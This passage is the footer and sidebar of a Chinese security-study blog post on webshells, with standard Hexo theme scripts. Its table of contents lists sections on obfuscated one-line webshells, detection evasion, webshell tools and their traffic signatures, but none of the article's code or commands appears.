+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://gungnir.top/">晚上十一点睡觉</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://gungnir.top/5917.html">http://gungnir.top/5917.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://gungnir.top" target="_blank">晚上十一点睡觉</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Web%E5%AE%89%E5%85%A8/">Web安全</a><a class="post-meta__tags" href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">命令执行</a><a class="post-meta__tags" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a><a class="post-meta__tags" href="/tags/Webshell/">Webshell</a></div><div class="post_share"><div class="social-share" data-image="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237571.jpeg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/44082.html"><img class="prev-cover" src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237505.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">0x08 - Web安全基础-文件上传</div></div></a></div><div class="next-post pull-right"><a href="/1811.html"><img class="next-cover" src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237522.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">常见中间件解析漏洞</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/20558.html" title="0x09 - Web安全基础-Linux反弹shell"><img class="cover" src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237511.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-14</div><div class="title">0x09 - Web安全基础-Linux反弹shell</div></div></a></div><div><a href="/61475.html" title="0x09 - Web安全基础-Windows反弹shell"><img class="cover" src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208211308747.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-14</div><div class="title">0x09 - Web安全基础-Windows反弹shell</div></div></a></div><div><a href="/34204.html" title="0x09 - Web安全基础-命令执行GetShell"><img class="cover" src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208211308748.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-14</div><div class="title">0x09 - Web安全基础-命令执行GetShell</div></div></a></div><div><a href="/44082.html" title="0x08 - Web安全基础-文件上传"><img class="cover" src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237505.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-13</div><div class="title">0x08 - Web安全基础-文件上传</div></div></a></div><div><a href="/65078.html" title="Web安全基础知识"><img class="cover" src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237529.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-10-16</div><div class="title">Web安全基础知识</div></div></a></div><div><a href="/39231.html" title="0x07 - Web安全基础-SQL注入"><img class="cover" src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208211308753.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-16</div><div class="title">0x07 - Web安全基础-SQL注入</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208151640204.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">晚上十一点睡觉</div><div class="author-info__description">晚上十一点のBlog</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">104</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">63</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">41</div></a></div><a id="card-info-btn" target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/11pmsleep"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/11pmsleep" rel="external nofollow noreferrer" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:860637048@qq.com" rel="external nofollow noreferrer" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="tencent://AddContact/?fromId=45&amp;fromSubId=1&amp;subcmd=all&amp;uin=860637048" rel="external nofollow noreferrer" target="_blank" title="qq"><i class="fab fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">笔记迁移整理中~~~以前习惯有道云记笔记，整理知识也算沉淀自己的一部分吧·· 加油··stay passionate and never say die!</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Webshell%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">Webshell简介</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E4%B8%80%E5%8F%A5%E8%AF%9DWebshell"><span class="toc-number">2.</span> <span class="toc-text">常用一句话Webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%89%88"><span class="toc-number">2.1.</span> <span class="toc-text">基础版</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E5%8F%98%E5%BD%A2"><span class="toc-number">2.2.</span> <span class="toc-text">简单变形</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E6%AC%A1%E5%8F%98%E5%BD%A2"><span class="toc-number">2.3.</span> <span class="toc-text">二次变形</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E6%AC%A1%E5%8F%98%E5%BD%A2"><span class="toc-number">2.4.</span> <span class="toc-text">三次变形</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E6%AC%A1%E5%8F%98%E5%BD%A2"><span class="toc-number">2.5.</span> <span class="toc-text">四次变形</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%9A%8F%E6%9C%BA%E5%BC%82%E6%88%96%E6%97%A0%E9%99%90%E5%85%8D%E6%9D%80d%E7%9B%BE%E8%9A%81%E5%89%91%E7%89%88%EF%BC%9A"><span class="toc-number">2.5.1.</span> <span class="toc-text">利用随机异或无限免杀d盾蚁剑版：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%8A%A8%E6%80%81%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%8A%A0%E5%AF%86%E5%AE%9E%E7%8E%B0%E6%96%B0%E5%9E%8B%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%EF%BC%9A"><span class="toc-number">2.5.2.</span> <span class="toc-text">利用动态二进制加密实现新型一句话木马：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#webshell%E8%BF%87D-%E7%9B%BE%E5%85%8D%E6%9D%80"><span class="toc-number">2.6.</span> <span class="toc-text">webshell过D 盾免杀</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%9B%9E%E8%B0%83%E5%87%BD%E6%95%B0%EF%BC%9A%E5%8F%AF%E4%BB%A5%E6%88%90%E5%8A%9F%E5%85%8D%E6%9D%80%EF%BC%9B"><span class="toc-number">2.6.1.</span> <span class="toc-text">使用回调函数：可以成功免杀；</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E7%B1%BB%EF%BC%9A%E5%8F%AF%E4%BB%A5%E5%85%8D%E6%9D%80"><span class="toc-number">2.6.2.</span> <span class="toc-text">使用类：可以免杀</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%95%B0%E7%BB%84%EF%BC%9A%E5%8F%AF%E4%BB%A5%E5%85%8D%E6%9D%80"><span class="toc-number">2.6.3.</span> <span class="toc-text">使用数组：可以免杀</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Webshell%E5%8E%9F%E7%90%86"><span class="toc-number">3.</span> <span class="toc-text">Webshell原理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-number">3.1.</span> <span class="toc-text">php一句话木马</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jsp%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-number">3.2.</span> <span class="toc-text">jsp一句话木马</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8Webshell%E5%81%9A%E6%9B%B4%E5%A4%9A%E4%BA%8B%E6%83%85"><span class="toc-number">4.</span> <span class="toc-text">利用Webshell做更多事情</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81webshell%E6%98%AF%E5%90%A6%E4%B8%8A%E4%BC%A0%E6%88%90%E5%8A%9F"><span class="toc-number">4.1.</span> <span class="toc-text">验证webshell是否上传成功</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%A8hackbar-post%E8%BF%9B%E8%A1%8C%E4%BC%A0%E5%85%A5cmd%E5%91%BD%E4%BB%A4"><span class="toc-number">4.2.</span> <span class="toc-text">在hackbar post进行传入cmd命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Webshell%E5%B7%A5%E5%85%B7%E8%BF%9E%E6%8E%A5Webshell"><span class="toc-number">4.3.</span> <span class="toc-text">Webshell工具连接Webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80"><span class="toc-number">4.3.1.</span> <span class="toc-text">中国菜刀</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%9A%81%E5%89%91-AntSword"><span class="toc-number">4.3.2.</span> <span class="toc-text">蚁剑-AntSword</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%B0%E8%9D%8E-Behinder"><span class="toc-number">4.3.3.</span> <span class="toc-text">冰蝎-Behinder</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%93%A5%E6%96%AF%E6%8B%89-Godzilla"><span class="toc-number">4.3.4.</span> <span class="toc-text">哥斯拉-Godzilla</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81Webshell%E7%9A%84%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81"><span class="toc-number">5.</span> <span class="toc-text">常见Webshell的流量特征</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%9A%81%E5%89%91-AntSword-1"><span class="toc-number">5.1.</span> <span class="toc-text">蚁剑-AntSword</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86%E9%80%9A%E8%BF%87Burp%E6%8A%93%E8%9A%81%E5%89%91%E7%9A%84%E5%8C%85"><span class="toc-number">5.1.1.</span> <span class="toc-text">配置代理通过Burp抓蚁剑的包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E6%98%AF%E5%90%A6%E5%8F%AF%E4%BB%A5%E6%8A%93%E5%88%B0%E5%8C%85"><span class="toc-number">5.1.2.</span> <span class="toc-text">验证是否可以抓到包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81"><span class="toc-number">5.1.3.</span> <span class="toc-text">分析流量特征</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%EF%BC%9A"><span class="toc-number">5.1.4.</span> <span class="toc-text">总结流量特征：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%B0%E8%9D%8E-Behinder-1"><span class="toc-number">5.2.</span> <span class="toc-text">冰蝎-Behinder</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%93%A5%E6%96%AF%E6%8B%89-Godzilla-1"><span class="toc-number">5.3.</span> <span class="toc-text">哥斯拉-Godzilla</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WAF"><span class="toc-number">6.</span> <span class="toc-text">WAF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#WAF%E7%9A%84%E6%9C%AC%E8%B4%A8"><span class="toc-number">6.1.</span> <span class="toc-text">WAF的本质</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WAF-%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93"><span class="toc-number">6.2.</span> <span class="toc-text">WAF 的绕过方法总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%BE%E7%89%87%E9%A9%AC"><span class="toc-number">7.</span> <span class="toc-text">图片马</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#refer"><span class="toc-number">8.</span> <span class="toc-text">refer</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/1.html" title="无题"><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237492.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无题"/></a><div class="content"><a class="title" href="/1.html" title="无题">无题</a><time datetime="2022-11-27T19:05:35.005Z" title="更新于 2022-11-28 03:05:35">2022-11-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/1539.html" title="浏览器DNS缓存"><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237511.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="浏览器DNS缓存"/></a><div class="content"><a class="title" href="/1539.html" title="浏览器DNS缓存">浏览器DNS缓存</a><time datetime="2022-11-27T19:04:54.340Z" title="更新于 2022-11-28 03:04:54">2022-11-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/19742.html" title="本机域名解析文件 hosts"><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208211308750.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="本机域名解析文件 hosts"/></a><div class="content"><a class="title" href="/19742.html" title="本机域名解析文件 hosts">本机域名解析文件 hosts</a><time datetime="2022-11-27T19:04:54.335Z" title="更新于 2022-11-28 03:04:54">2022-11-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/64913.html" title="操作系统DNS缓存"><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237506.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="操作系统DNS缓存"/></a><div class="content"><a class="title" href="/64913.html" title="操作系统DNS缓存">操作系统DNS缓存</a><time datetime="2022-11-27T19:04:54.331Z" title="更新于 2022-11-28 03:04:54">2022-11-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/16526.html" title="nmap学习"><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208182237502.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="nmap学习"/></a><div class="content"><a class="title" href="/16526.html" title="nmap学习">nmap学习</a><time datetime="2022-11-27T19:04:54.328Z" title="更新于 2022-11-28 03:04:54">2022-11-28</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By 晚上十一点睡觉</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Welcome to 11pmsleep's blog ~~~ 该网站用来记录学习笔记及生活，欢迎交流技术~~~Blog仅供个人记录笔记学习所用，若有侵权，联系我删除~若有错误，也望诸君不吝指正</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="chat_btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (true){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>(()=>{
+  const init = () => {
+    twikoo.init(Object.assign({
+      el: '#twikoo-wrap',
+      envId: 'https://twikoo.gungnir.top/',
+      region: '',
+      onCommentLoaded: function () {
+        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
+      }
+    }, null))
+  }
+
+  const getCount = () => {
+    const countELement = document.getElementById('twikoo-count')
+    if(!countELement) return
+    twikoo.getCommentsCount({
+      envId: 'https://twikoo.gungnir.top/',
+      region: '',
+      urls: [window.location.pathname],
+      includeReply: false
+    }).then(function (res) {
+      countELement.innerText = res[0].count
+    }).catch(function (err) {
+      console.error(err);
+    });
+  }
+
+  const runFn = () => {
+    init()
+    GLOBAL_CONFIG_SITE.isPost && getCount()
+  }
+
+  const loadTwikoo = () => {
+    if (typeof twikoo === 'object') {
+      setTimeout(runFn,0)
+      return
+    } 
+    getScript('https://cdn.jsdelivr.net/npm/twikoo/dist/twikoo.all.min.js').then(runFn)
+  }
+
+  if ('Twikoo' === 'Twikoo' || !false) {
+    if (false) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
+    else loadTwikoo()
+  } else {
+    window.loadOtherComment = () => {
+      loadTwikoo()
+    }
+  }
+})()</script></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
